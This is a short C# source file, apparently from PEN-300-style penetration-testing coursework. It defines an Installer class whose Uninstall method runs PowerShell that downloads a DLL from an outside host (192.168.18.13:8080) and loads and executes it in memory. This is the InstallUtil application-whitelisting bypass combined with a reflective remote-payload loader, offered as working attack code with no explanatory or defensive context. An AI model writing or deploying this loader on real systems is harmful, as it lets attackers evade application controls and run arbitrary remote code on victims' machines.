using System;
using System.IO;
using System.Reflection;
using System.Text;
using System.Collections.Generic;
using System.Collections.ObjectModel;
using System.Management.Automation;
using System.Management.Automation.Runspaces;

namespace Pen300.CS
{
    [System.ComponentModel.RunInstaller(true)]
    public class Install : System.Configuration.Install.Installer
    {
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            var runspace = RunspaceFactory.CreateRunspace();
            runspace.Open();
            var environment = PowerShell.Create();
            environment.Runspace = runspace;
            var arg = "[System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData('http://192.168.18.13:8080/Review.dll')).GetType('AgentLean.Program').GetMethod('Start').Invoke(0, $null)";

            environment.AddScript(arg);

            environment.Invoke();

            runspace.Close();
        }
    }
}
